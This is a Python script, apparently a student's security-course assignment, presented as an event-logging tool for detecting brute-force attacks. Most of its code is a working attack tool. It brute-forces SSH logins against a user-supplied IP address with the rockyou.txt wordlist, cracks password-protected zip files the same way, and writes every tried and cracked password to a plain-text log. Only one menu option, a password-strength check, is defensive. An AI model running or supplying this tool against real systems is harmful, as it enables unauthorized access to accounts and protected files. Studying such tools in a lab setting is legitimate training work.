#!/usr/bin/env python3

# Script Name:                  Ops Challenge: Event Logging Tool Part 1 of 3
# Author:                       Cody Blahnik
# Date of latest revision:      06/3/24
# Purpose:                      Create logs to detect Brute Force attacks

import time  
import getpass  
import os 
import paramiko  
import zipfile  
import logging
from logging.handlers import RotatingFileHandler

# Set up logging with rotation
log_handler = RotatingFileHandler('brute_force.log', maxBytes=5*1024*1024, backupCount=3)  # 5MB per file, 3 backups
log_handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
log_handler.setFormatter(formatter)

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
logger.addHandler(log_handler)

# Function that reads file
def read_file(filepath, delay=0):
    if not os.path.isfile(filepath):  
        logger.error(f"File not found: {filepath}")  
        return None
    with open(filepath, encoding="ISO-8859-1") as file:  
        for line in file:
            yield line.rstrip()  
            if delay:
                time.sleep(delay)  

# Function to iterate through words in a dictionary file
def iterator():
    filepath = input("Enter your dictionary filepath (default: rockyou.txt):\n") or "rockyou.txt"
    for word in read_file(filepath, delay=1):  
        if word is None:
            return
        logger.info(f"Read word: {word}")  
        print(word)

# Function to check if a password is in a dictionary file
def check_password():
    usr_password = getpass.getpass(prompt="Please enter a password: ")
    usr_filepath = input("Enter a dictionary filepath (default: rockyou.txt):\n") or "rockyou.txt"
    wordlist = list(read_file(usr_filepath)) 
    if wordlist is None:
        return

    if usr_password not in wordlist:  
        logger.info("Password is acceptable.")  
        print("Your password is acceptable. Good job.")
    else:
        logger.warning("Password found in dictionary.")  
        print("Your password was found in the dictionary. Please choose another password.")

# Function to perform a brute force SSH attack
def brute_force_ssh():
    ip = input("Enter the target IP address:\n")
    username = input("Enter the SSH username:\n")
    filepath = input("Enter your dictionary filepath (default: rockyou.txt):\n") or "rockyou.txt"
    wordlist = read_file(filepath)
    if wordlist is None:
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  

    for password in wordlist:
        try:
            ssh.connect(ip, port=22, username=username, password=password, timeout=3)  
            logger.info(f"Success! Username: {username} Password: {password}")  
            print(f"Success! Username: {username} Password: {password}")
            break
        except paramiko.AuthenticationException:
            logger.warning(f"Failed: {password}")  
            print(f"Failed: {password}")
        except Exception as e:
            logger.error(f"Connection error: {e}")  
            print(f"Connection error: {e}")
            break
    ssh.close()  

# Function to perform a brute force attack on a password-protected zip file
def brute_force_zip():
    zip_filepath = input("Enter the path to the password-protected zip file:\n")
    dict_filepath = input("Enter your dictionary filepath (default: rockyou.txt):\n") or "rockyou.txt"
    wordlist = read_file(dict_filepath)
    if wordlist is None:
        return

    with zipfile.ZipFile(zip_filepath) as zf:  
        for password in wordlist:
            try:
                zf.extractall(pwd=bytes(password, 'utf-8'))  
                logger.info(f"Success! Password: {password}")  
                print(f"Success! Password: {password}")
                break
            except RuntimeError:
                logger.warning(f"Failed: {password}")  
                print(f"Failed: {password}")
            except zipfile.BadZipFile:
                logger.error(f"Bad zip file: {zip_filepath}")  
                print(f"Bad zip file: {zip_filepath}")
                break

# Main function to handle menu and user input
def main():
    while True:
        print("\nBrute Force Wordlist Attack Tool Menu")
        print("1 - Offensive, ")
        print("2 - Defensive, ")
        print("3 - Offensive, SSH Brute Force")
        print("4 - Offensive, ZIP Brute Force")
        print("5 - Exit")
        
        mode = input("Please enter a number: ")
        if mode == "1":
            iterator()  
        elif mode == "2":
            check_password()  
        elif mode == "3":
            brute_force_ssh()  
        elif mode == "4":
            brute_force_zip()  
        elif mode == "5":
            break  
        else:
            logger.warning("Invalid selection")  
            print("Invalid selection...")

if __name__ == "__main__":
    main()
